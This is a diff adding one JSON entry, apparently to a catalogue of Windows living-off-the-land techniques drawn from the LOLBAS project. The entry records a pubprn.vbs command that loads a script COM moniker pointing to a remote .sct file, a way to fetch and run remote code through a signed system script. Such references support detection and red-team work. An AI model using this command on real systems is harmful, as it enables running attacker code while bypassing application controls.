@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-pubprn-vbs-execute",
+  "name": "LOLBAS · Pubprn.vbs (Execute)",
+  "command": "pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}",
+  "description": "Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "pubprn.vbs",
+    "execute"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Pubprn.vbs/",
+  "upstream_id": "Pubprn.vbs/Execute/0",
+  "category": "lolbas",
+  "subcategory": "execute",
+  "references": [
+    {
+      "title": "LOLBAS — Pubprn.vbs",
+      "url": "https://lolbas-project.github.io/lolbas/Pubprn.vbs/"
+    }
+  ]
+}
